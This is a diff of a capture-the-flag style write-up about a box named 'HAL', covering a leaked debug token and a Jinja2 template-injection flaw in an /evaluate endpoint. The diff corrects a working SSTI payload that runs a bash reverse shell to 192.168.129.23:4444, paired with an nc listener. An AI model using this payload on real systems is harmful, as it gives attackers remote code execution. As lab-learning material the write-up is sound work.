@@ -37,7 +37,7 @@ in the head tag, we see the following comments
 ```
 these will be the starting points for 2 different of ways of getting a shell into the box
 
-## Debug endpoint
+### Debug endpoint
 
 In api/debug we get
 ```
@@ -76,7 +76,9 @@ curl -v -G http://localhost:5042/api/debug\
  --data-urlencode "token=h4l_d3bug_t0k3n_2024"
 ```
 
-## Evaluate injection
+this is a process/devops failure a dev build should never be deployed and several checks should be implemented in the CI/CD pipeline to prevent such a thing.
+
+### Evaluate injection
 
 In static/js/debug.js, we get
 ```
@@ -93,16 +95,12 @@ window.HAL_DEBUG = {
     note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
 };
 ```
-we learned that the server is python so we can try to inject python code using this evaluate endpoint with those headers
+we learned that the server is using jinja2 templates so we can try to inject python code using this evaluate endpoint with those headers
 ```
 nc -lvnp 4444
-curl -X POST http://192.168.56.102:5042/evaluate \
+curl -X POST http://localhost:5042/evaluate \
   -H "X-Debug-Render: true" \
-  --data-urlencode "project_name={{ self.init.globals.builtins.import('os').popen('bash -c "bash -i >& /dev/tcp/192.168.129.23/4444 0>&1"').read() }}"
-```
-we can get further information from /api/internal/schema
-```
-{"host":"127.0.0.1","note":"debug command handler still enabled \u2014 paco","port":7042,"render_debug_header":"X-Debug-Render","service":"hal9042d","transport":"tcp"}
+  --data-urlencode "project_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.129.23/4444 0>&1"').read() }}"
 ```
 
 
